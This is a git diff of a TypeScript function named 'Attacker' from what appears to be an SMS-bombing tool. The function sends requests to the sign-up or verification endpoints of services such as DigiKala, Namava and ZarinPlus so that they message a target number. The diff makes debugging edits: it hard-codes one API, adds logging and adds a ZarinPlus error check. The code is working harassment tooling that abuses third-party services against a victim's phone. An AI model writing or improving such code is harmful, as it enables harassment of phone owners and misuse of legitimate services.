@@ -3,7 +3,8 @@ import { API as APIs } from "./api";
 
 export const Attacker = async (num: number, Loop: string) => {
   return new Promise((resolve, reject) => {
-    const API = APIs(num)[Math.floor(Math.random() * APIs(num).length)];
+    // const API = APIs(num)[Math.floor(Math.random() * APIs(num).length)];
+    const API = APIs(num)[15];
     var headers: object;
     headers = API.headers;
 
@@ -20,17 +21,22 @@ export const Attacker = async (num: number, Loop: string) => {
               error: { message: string };
             };
           }) => {
-            if (API.name === "DigiKala" && res.data.status === 400)
+            console.log(res.data);
+
+            if (API.name === "DigiKala" && res.data.status === 400) {
               reject(`Request From ${API.name} Failed \n${res.data.message}`);
-            else if (API.name === "Namava" && !res.data.succeeded)
+            } else if (API.name === "Namava" && !res.data.succeeded) {
               reject(
                 `Request From ${API.name} Failed \n${res.data.error.message}`
               );
-            else if (res.status === 200)
+            } else if (API.name === "ZarinPlus" && !res.data.status) {
+              reject(`Request From ${API.name} Failed \n${res.data.message}`);
+            } else if (res.status === 200) {
               resolve(`Request From ${API.name} Sends To ${num}`);
+            }
           }
         )
-        .catch((error: { response: { statusText: string } }) => {
+        .catch((error: { response: { statusText: string } }) => {                
           reject(`${API.name} : \n${error.response.statusText}`);
         });
     } else {
